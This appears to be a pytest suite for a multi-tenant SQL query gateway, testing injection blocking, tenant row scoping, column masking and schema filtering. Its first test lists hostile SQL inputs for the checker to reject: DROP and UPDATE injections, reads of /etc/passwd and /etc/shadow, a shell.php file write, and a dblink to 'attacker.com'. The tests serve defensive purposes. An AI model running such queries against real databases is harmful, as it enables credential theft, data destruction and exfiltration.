"""Adversarial Security Test Suite for SQL Authorization, Tenant Isolation, and Policy Bypass."""

from __future__ import annotations

import re
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest
from fastapi.testclient import TestClient

from app_factory import create_app
from auth import Principal
from repositories.sql_validators.sql_safety_checker import DefaultSqlSafetyChecker
from routes.sql_query_controller import _filter_schema_text_by_access
from services.policy_engine import (
    Policy,
    PolicyEvaluator,
    apply_row_restrictions,
    mask_rows,
    rewrite_masked_columns,
)
from services.query_gateway import GovernedQueryGateway, GovernedQueryRequest
from services.tenant_database_resolver import (
    TenantDatabaseConfig,
    TenantDatabaseResolutionError,
    TenantDatabaseResolver,
)


# =====================================================================
# 1. Adversarial SQL Injection & AST Bypass Vectors
# =====================================================================
class TestAdversarialSqlBypass:
    """Test SQL obfuscation, multi-statement injection, CTE mutations, and comments."""

    @pytest.fixture
    def checker(self) -> DefaultSqlSafetyChecker:
        return DefaultSqlSafetyChecker()

    @pytest.mark.parametrize(
        "malicious_sql",
        [
            # Multi-statement injection via semicolon
            "SELECT * FROM artist; DROP TABLE artist;",
            "SELECT 1; UPDATE users SET role = 'admin';",
            "SELECT * FROM artist; TRUNCATE TABLE logs;",
            # Mutating CTEs
            "WITH hacked AS (DELETE FROM users WHERE 1=1 RETURNING *) SELECT * FROM hacked",
            "WITH evil AS (INSERT INTO admin_users VALUES ('hacker') RETURNING *) SELECT 1 FROM evil",
            "WITH wiped AS (UPDATE accounts SET balance = 0 RETURNING *) SELECT * FROM wiped",
            # Subqueries attempting mutations
            "SELECT * FROM artist WHERE id IN (DELETE FROM artist RETURNING id)",
            "SELECT (UPDATE secrets SET val = 'leaked' RETURNING 1)",
            # Side-channel & dangerous functions
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_read_binary_file('/etc/shadow')",
            "SELECT pg_file_write('shell.php', 'malicious code', true)",
            "SELECT dblink_connect('evil', 'host=attacker.com user=x password=y')",
            "SELECT dblink_exec('evil', 'DROP TABLE sensitive_data')",
            "SELECT lo_export(1234, '/tmp/leak')",
            "SELECT lo_import('/etc/passwd')",
            # Inline / block comments evasion attempts
            "SELECT * FROM artist -- attempt comment bypass",
            "SELECT * FROM artist /* comment */ WHERE 1=1",
            "SELECT * FROM artist /*!50000 DROP TABLE artist */",
            # State-altering DDL / DCL commands
            "CREATE TABLE backdoors (id int)",
            "ALTER TABLE users DROP COLUMN password_hash",
            "GRANT ALL PRIVILEGES ON DATABASE postgres TO public",
            "REVOKE SELECT ON ALL TABLES FROM gateway_readonly_user",
        ],
    )
    def test_blocks_adversarial_queries(self, checker: DefaultSqlSafetyChecker, malicious_sql: str) -> None:
        assert checker.is_safe_select_query(malicious_sql) is False


# =====================================================================
# 2. Adversarial Row-Level Policy Rewrite & Aliasing
# =====================================================================
class TestAdversarialRowPolicy:
    """Ensure row-level scoping cannot be subverted via joins, CTEs, or ambiguous aliases."""

    @pytest.fixture
    def principal(self) -> Principal:
        return Principal(
            user_id="alice-123",
            email="alice@tenant-a.com",
            org_id="tenant-a",
            roles=frozenset({"viewer"}),
            attributes={"tenant_id": "tenant-a", "dept": "engineering"},
        )

    def test_row_restriction_applied_to_all_table_aliases(self, principal: Principal) -> None:
        sql = (
            "SELECT e.name, d.name FROM employees e "
            "JOIN departments d ON e.dept_id = d.id "
            "WHERE e.active = true"
        )
        restricted = apply_row_restrictions(sql, {"tenant_id": "tenant_id"}, principal)
        # Predicate must be qualified on aliases so neither table escapes tenant restriction
        assert "e.tenant_id = 'tenant-a'" in restricted
        assert "d.tenant_id = 'tenant-a'" in restricted

    def test_row_restriction_with_subqueries(self, principal: Principal) -> None:
        sql = "SELECT * FROM (SELECT id, name FROM employees) sub WHERE sub.id > 10"
        restricted = apply_row_restrictions(sql, {"tenant_id": "tenant_id"}, principal)
        assert "employees.tenant_id = 'tenant-a'" in restricted

    def test_row_restriction_missing_attribute_fails_closed(self) -> None:
        unprivileged_principal = Principal(
            user_id="bob",
            email="bob@tenant-a.com",
            org_id="tenant-a",
            roles=frozenset({"viewer"}),
            attributes={},  # Missing required 'dept'
        )
        sql = "SELECT * FROM employees"
        with pytest.raises(PermissionError, match="Required subject attribute 'dept' is absent"):
            apply_row_restrictions(sql, {"dept": "dept"}, unprivileged_principal)

    def test_row_restriction_cannot_be_detached_from_union_branches(self, principal: Principal) -> None:
        """A trailing WHERE binds to the last UNION branch only; every branch must be scoped."""
        sql = "SELECT * FROM employees e UNION SELECT * FROM employees x"
        restricted = apply_row_restrictions(sql, {"tenant_id": "tenant_id"}, principal)
        # A root-level WHERE would only constrain the final branch and let the
        # first branch read every tenant's rows.
        assert restricted.count("tenant_id = 'tenant-a'") == 2
        first, second = restricted.split("UNION", 1)
        assert "e.tenant_id = 'tenant-a'" in first
        assert "x.tenant_id = 'tenant-a'" in second

    def test_row_restriction_scope_is_applied_inside_derived_tables(self, principal: Principal) -> None:
        """Physical tables hidden inside subqueries must still be constrained."""
        sql = "WITH x AS (SELECT * FROM employees) SELECT * FROM x"
        restricted = apply_row_restrictions(sql, {"tenant_id": "tenant_id"}, principal)
        assert "employees.tenant_id = 'tenant-a'" in restricted

    def test_row_restriction_leaves_unrestricted_sql_unchanged(self, principal: Principal) -> None:
        assert apply_row_restrictions("SELECT 1", {}, principal) == "SELECT 1"


# =====================================================================
# 3. Adversarial Column Masking Bypass Attempts
# =====================================================================
class TestAdversarialColumnMasking:
    """Ensure masking cannot be bypassed through aliases, expressions, or CASE statements."""

    def test_masking_applied_to_renamed_aliases(self) -> None:
        sql = "SELECT ssn AS employee_identifier, email AS contact_email, name FROM employees"
        rows = [{"employee_identifier": "123-45-6789", "contact_email": "alice@corp.com", "name": "Alice"}]
        masked = mask_rows(rows, frozenset({"ssn", "email"}), sql=sql)
        assert masked[0]["employee_identifier"] is None
        assert masked[0]["contact_email"] is None
        assert masked[0]["name"] == "Alice"

    def test_masking_applied_to_expression_aliases(self) -> None:
        sql = "SELECT CONCAT(ssn, '-secret') AS obfuscated_ssn, name FROM employees"
        rows = [{"obfuscated_ssn": "123-45-6789-secret", "name": "Alice"}]
        masked = mask_rows(rows, frozenset({"ssn"}), sql=sql)
        assert masked[0]["obfuscated_ssn"] is None
        assert masked[0]["name"] == "Alice"

    def test_masked_columns_nulled_at_source_for_aggregates(self) -> None:
        """Aggregates over a masked column must compute over NULL so the value cannot leak."""
        rewritten = rewrite_masked_columns(
            "SELECT dept, sum(salary), avg(salary) FROM employees GROUP BY dept",
            frozenset({"salary"}),
        )
        assert "SUM(NULL)" in rewritten
        assert "AVG(NULL)" in rewritten

    def test_masked_columns_nulled_at_source_across_rebinding_aliases(self) -> None:
        """Masking must survive derived-table and implicit alias rebinding."""
        for sql in (
            "SELECT s FROM (SELECT salary AS s FROM employees) x",
            "SELECT salary s FROM employees",
            "SELECT (SELECT salary FROM employees LIMIT 1) AS s",
        ):
            rewritten = rewrite_masked_columns(sql, frozenset({"salary"}))
            # 'salary' may only survive as an output header (NULL AS salary),
            # never as a real column reference, so it must be preceded by AS.
            assert re.search(r"\bsalary\b", rewritten.replace("AS salary", "")) is None

    def test_masked_columns_nulled_at_source_with_star_projection(self) -> None:
        """Star projections cannot be rewritten; values must still be nulled by name."""
        rewritten = rewrite_masked_columns("SELECT * FROM employees", frozenset({"salary"}))
        # rewrite is a no-op for star; the name-based post-mask handles the result
        assert rewritten == "SELECT * FROM employees"


# =====================================================================
# 4. Cross-Tenant Isolation Adversarial Matrix
# =====================================================================
class TestAdversarialTenantIsolation:
    """Test cross-tenant token replay, spoofed headers, and direct ID injection."""

    def test_cross_tenant_token_access_rejected_by_resolver(self) -> None:
        resolver = TenantDatabaseResolver(
            [
                TenantDatabaseConfig("tenant-a", "db-a", "sqlite+aiosqlite:///a.sqlite"),
                TenantDatabaseConfig("tenant-b", "db-b", "sqlite+aiosqlite:///b.sqlite"),
            ]
        )

        principal_a = Principal("user-a", "a@corp.com", "tenant-a", frozenset({"viewer"}))

        # Tenant A tries to resolve Tenant B database ID -> Must fail closed
        with pytest.raises(TenantDatabaseResolutionError):
            resolver.resolve(principal_a, "db-b")

    @pytest.mark.asyncio
    async def test_spoofed_headers_cannot_override_verified_principal(self) -> None:
        """Verify that X-Tenant-Id or X-User headers cannot trick the gateway."""
        principal = Principal("user-a", "a@corp.com", "tenant-a", frozenset({"viewer"}))
        binding_a = TenantDatabaseConfig("tenant-a", "db-a", "sqlite+aiosqlite:///:memory:")

        service_mock = MagicMock()
        service_mock.repository.database_target = "primary"
        service_mock.execute_sql_statement = AsyncMock(return_value=[{"id": 1}])

        provider = MagicMock()
        provider.resolve.return_value = (binding_a, service_mock)

        gateway = GovernedQueryGateway(
            provider=provider,
            safety_checker=DefaultSqlSafetyChecker(),
        )

        result = await gateway.execute(
            GovernedQueryRequest(
                principal=principal,
                database_id="db-a",
                sql="SELECT id FROM orders",
            )
        )
        assert result == [{"id": 1}]
        # Service must strictly be resolved using the authentic principal org_id, never external headers
        provider.resolve.assert_called_once_with(principal, "db-a")


# =====================================================================
# 5. GraphQL Query Depth Limiting Verification
# =====================================================================
class TestGraphQLQueryDepthSecurity:
    """Verify that deeply nested GraphQL queries (> 6 levels) are rejected."""

    def test_query_depth_limiter_rejects_excessive_depth(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def fake_validate(token: str | None) -> dict[str, Any] | None:
            return {
                "sub": "auth0|user-123",
                "email": "alice@example.com",
                "https://app.secure-db-access-gateway.org/tenant_id": "org-42",
                "roles": ["viewer"],
            }

        monkeypatch.setattr("middlewares.rbac_middleware.validate_access_token", fake_validate)
        client = TestClient(create_app())

        # Construct a query exceeding max_depth 6
        deep_query = """
        query DeepQuery {
            __schema {
                types {
                    fields {
                        type {
                            fields {
                                type {
                                    fields {
                                        name
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        response = client.post(
            "/graphql",
            json={"query": deep_query},
            headers={"Authorization": "Bearer valid-token"},
        )
        assert response.status_code == 200
        data = response.json()
        assert "errors" in data
        assert any("depth" in err["message"].lower() for err in data["errors"])


# =====================================================================
# 6. Effective schema access: introspection must mirror policy decisions
# =====================================================================
class TestEffectiveAccess:
    """Verify the display-side view of a principal's schema matches the query gate."""

    @staticmethod
    def _principal(*, org_id: str = "tenant-a", **attributes: str) -> Principal:
        attrs = {"tenant_id": org_id, "dept": "engineering", **attributes}
        return Principal(
            "alice-123", "alice@tenant-a.com", org_id, frozenset({"viewer"}), attributes=attrs
        )

    @classmethod
    def _restricted_evaluator(cls) -> PolicyEvaluator:
        return PolicyEvaluator(
            [
                Policy(
                    id="allow-employees",
                    effect="allow",
                    org_id="tenant-a",
                    database_id="db-a",
                    table="employees",
                    columns={"id", "name", "dept", "salary"},
                    masked_columns={"salary"},
                ),
                Policy(
                    id="deny-salaries",
                    effect="deny",
                    org_id="tenant-a",
                    database_id="db-a",
                    table="salaries",
                ),
            ]
        )

    def test_denied_tables_are_invisible(self) -> None:
        access = self._restricted_evaluator().effective_access(self._principal(), "db-a")
        assert access.table_accessible("employees")
        assert not access.table_accessible("salaries")
        assert not access.table_accessible("payroll")

    def test_column_whitelist_mirrors_evaluator_allow_union(self) -> None:
        access = self._restricted_evaluator().effective_access(self._principal(), "db-a")
        assert access.column_accessible("employees", "dept")
        assert not access.column_accessible("employees", "ssn")
        assert not access.column_accessible("salaries", "amount")

    def test_masked_columns_are_still_readable_but_nulled_at_query_time(self) -> None:
        access = self._restricted_evaluator().effective_access(self._principal(), "db-a")
        assert access.is_masked("salary")
        assert not access.is_masked("dept")

    def test_principal_not_matched_by_any_policy_sees_nothing(self) -> None:
        access = self._restricted_evaluator().effective_access(
            self._principal(org_id="tenant-b"), "db-a"
        )
        assert not access.table_accessible("employees")
        assert not access.table_accessible("any")

    def test_disabled_evaluator_is_unrestricted(self) -> None:
        access = PolicyEvaluator(enabled=False).effective_access(self._principal(), "db-a")
        assert access.unrestricted
        assert access.table_accessible("anything")


class TestSchemaTextFiltering:
    """Embedding text-to-sql schema text must leak nothing the principal cannot read."""

    SCHEMA_TEXT = (
        "employees:\n"
        "  id: PK\n"
        "  name: employee name\n"
        "  ssn: social security number\n"
        "salaries:\n"
        "  amount: compensation\n"
    )

    def test_denied_tables_and_columns_pruned(self) -> None:
        access = TestEffectiveAccess._restricted_evaluator().effective_access(
            TestEffectiveAccess._principal(), "db-a"
        )
        filtered = _filter_schema_text_by_access(self.SCHEMA_TEXT, access)
        assert "employees:" in filtered
        assert "id: PK" in filtered
        assert "name: employee name" in filtered
        assert "ssn" not in filtered
        assert "salaries:" not in filtered
        assert "amount" not in filtered

    def test_unrestricted_access_leaves_text_untouched(self) -> None:
        access = PolicyEvaluator(enabled=False).effective_access(
            TestEffectiveAccess._principal(), "db-a"
        )
        assert _filter_schema_text_by_access(self.SCHEMA_TEXT, access) == self.SCHEMA_TEXT
